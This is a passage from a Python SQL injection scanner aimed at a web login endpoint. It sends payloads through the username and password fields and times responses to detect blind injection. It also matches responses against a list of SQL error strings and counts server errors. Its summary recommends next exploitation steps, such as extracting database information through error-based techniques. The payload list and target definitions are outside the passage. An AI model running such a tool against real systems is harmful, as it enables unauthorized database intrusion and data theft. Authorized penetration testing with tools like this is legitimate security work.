def send_login_request(username, password, payload_name):
    """Send POST request to login endpoint and measure response time"""
    try:
        start_time = time.time()
        response = requests.post(
            TARGET_URL,
            data={'username': username, 'password': password},
            timeout=30
        )
        end_time = time.time()
        
        response_time = end_time - start_time
        return {
            'status_code': response.status_code,
            'response_time': response_time,
            'content_length': len(response.content),
            'response_text': response.text,
            'headers': dict(response.headers),
            'error': None
        }
    except requests.exceptions.Timeout:
        return {'error': 'Timeout', 'response_time': None, 'status_code': None}
    except Exception as e:
        return {'error': str(e), 'response_time': None, 'status_code': None}

def test_payload_against_endpoint(payload_name, payload, expected_delay=None, username_test=True, password_test=True, both_test=True):
    """Test a single payload in username, password, and both fields"""
    results = []
    
    # Test 1: Payload in username, empty password
    if username_test:
        result = send_login_request(payload, '', f"{payload_name} [Username]")
        result['test_type'] = f"{payload_name} [Username]"
        result['payload'] = payload
        result['injection_point'] = 'username'
        result['expected_delay'] = expected_delay
        results.append(result)
    
    # Test 2: Payload in password, empty username
    if password_test:
        result = send_login_request('', payload, f"{payload_name} [Password]")
        result['test_type'] = f"{payload_name} [Password]"
        result['payload'] = payload
        result['injection_point'] = 'password'
        result['expected_delay'] = expected_delay
        results.append(result)
    
    # Test 3: Payload in both fields
    if both_test:
        result = send_login_request(payload, payload, f"{payload_name} [Both]")
        result['test_type'] = f"{payload_name} [Both]"
        result['payload'] = payload
        result['injection_point'] = 'both'
        result['expected_delay'] = expected_delay
        results.append(result)
    
    return results

def analyze_result(result):
    """Analyze a test result for anomalies"""
    anomalies = []
    
    if result['error']:
        anomalies.append(f"ERROR: {result['error']}")
        return anomalies
    
    # Check for time-based injection indicators
    if result['expected_delay'] and result['response_time']:
        if result['response_time'] >= (result['expected_delay'] - 0.5):
            anomalies.append(f"TIME-BASED DETECTED: Response took {result['response_time']:.2f}s (expected {result['expected_delay']}s)")
    
    # Check for response time anomalies (unusually fast or slow)
    if result['response_time'] and not result['expected_delay']:
        if result['response_time'] > TIMEOUT_THRESHOLD:
            anomalies.append(f"SLOW RESPONSE: {result['response_time']:.2f}s")
        elif result['response_time'] < 0.1:
            anomalies.append(f"FAST RESPONSE: {result['response_time']:.2f}s")
    
    # Check for status code anomalies (not the usual 200, 401, 403)
    if result['status_code']:
        if result['status_code'] in [200, 302, 401, 403]:
            # Normal auth response codes
            pass
        elif result['status_code'] >= 500:
            anomalies.append(f"SERVER ERROR: HTTP {result['status_code']}")
        elif result['status_code'] in [400, 405]:
            anomalies.append(f"CLIENT ERROR: HTTP {result['status_code']}")
    
    # Check for specific SQL error patterns
    if result.get('response_text'):
        text = result['response_text'].lower()
        sql_errors = [
            'sql', 'mysql', 'postgresql', 'sqlite', 'sqlstate',
            'syntax error', 'database error', 'query failed',
            'unclosed quotation mark', 'invalid syntax',
            'you have an error in your sql syntax'
        ]
        
        for error in sql_errors:
            if error in text:
                anomalies.append(f"SQL ERROR MESSAGE: Contains '{error}'")
                break
    
    return anomalies

def main():
    print("=" * 80)
    print("SQL INJECTION COMPREHENSIVE TESTING SUITE")
    print("Target: " + TARGET_URL)
    print("=" * 80)
    print()
    
    total_payloads = 0
    total_tests = 0
    all_results = []
    
    # Statistics tracking
    stats = {
        'time_based_triggered': 0,
        'sql_errors_found': 0,
        'server_errors': 0,
        'successful_bypass': 0,
        'anomalous_responses': 0
    }
    
    # Test each payload category
    for category, payload_list in PAYLOADS.items():
        print(f"[-] Testing {category.upper().replace('_', ' ')} payloads...")
        category_results = []
        
        for payload_name, payload, expected_delay in payload_list:
            # Track payload count
            total_payloads += 1
            
            # Test the payload (test all injection points)
            results = test_payload_against_endpoint(
                payload_name, 
                payload, 
                expected_delay,
                username_test=True,
                password_test=True,
                both_test=True
            )
            
            for result in results:
                total_tests += 1
                
                # Analyze for anomalies
                anomalies = analyze_result(result)
                result['anomalies'] = anomalies
                
                if anomalies:
                    stats['anomalous_responses'] += 1
                    
                    # Update specific stats
                    for anomaly in anomalies:
                        if "TIME-BASED DETECTED" in anomaly:
                            stats['time_based_triggered'] += 1
                        elif "SQL ERROR MESSAGE" in anomaly:
                            stats['sql_errors_found'] += 1
                        elif "SERVER ERROR" in anomaly:
                            stats['server_errors'] += 1
                    
                    # Print anomalies
                    print(f"[!] ANOMALY DETECTED:")
                    print(f"    Test: {result['test_type']}")
                    print(f"    Payload: {result['payload']}")
                    for anomaly in anomalies:
                        print(f"    -> {anomaly}")
                    if result['status_code']:
                        print(f"    Status: {result['status_code']}")
                        print(f"    Response time: {result['response_time']:.3f}s")
                        print(f"    Content length: {result['content_length']} bytes")
                    print()
                
                category_results.append(result)
        
        all_results.extend(category_results)
        print(f"[+] Completed {category.upper().replace('_', ' ')}: {len(payload_list)} payloads tested")
        print()
    
    # Print comprehensive summary
    print("=" * 80)
    print("COMPREHENSIVE TEST SUMMARY")
    print("=" * 80)
    print(f"Total payload types tested: {total_payloads}")
    print(f"Total injection attempts: {total_tests}")
    print()
    print("Anomalies detected:")
    print(f"  - Time-based injections triggered: {stats['time_based_triggered']}")
    print(f"  - SQL error messages found: {stats['sql_errors_found']}")
    print(f"  - Server error responses: {stats['server_errors']}")
    print(f"  - Anomalous responses total: {stats['anomalous_responses']}")
    print()
    
    # Analysis and recommendations
    print("=" * 80)
    print("ANALYSIS AND RECOMMENDATIONS")
    print("=" * 80)
    
    if stats['time_based_triggered'] > 0:
        print("[+] CRITICAL: Time-based blind SQL injection DETECTED!")
        print("  -> The application is vulnerable to time-based blind SQLi")
        print("  -> Manual verification needed for confirmation")
        print("  -> Recommend: Try different delay values for consistency")
        print()
    
    if stats['sql_errors_found'] > 0:
        print("[+] SQL error messages detected - Error-based SQL injection may be possible")
        print("  -> The application is leaking database error information")
        print("  -> This can help determine database type")
        print("  -> Recommend: Extract database version/info using error-based techniques")
        print()
    
    if stats['server_errors'] > 0:
        print("[+] Server error responses detected")
        print("  -> Some payloads are causing internal server errors")
        print("  -> This may indicate successful injection attempts")
        print("  -> Recommend: Focus on payloads that trigger 500 errors")
        print()
    
    if stats['anomalous_responses'] > 0:
        print(f"[+] Total anomalous responses: {stats['anomalous_responses']}")
        print("  -> These responses differ from baseline behavior")
        print("  -> Manual review of detailed results recommended")
        print()
    else:
        print("[-] No significant anomalies detected")
        print("  -> Standard responses to all payloads")
        print("  -> SQL injection may not be present")
        print("  -> Recommend: Try different payload encoding")
    
    return {
        'total_payloads': total_payloads,
        'total_tests': total_tests,
        'stats': stats,
        'all_results': all_results
    }

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Testing interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {str(e)}")
        sys.exit(1)
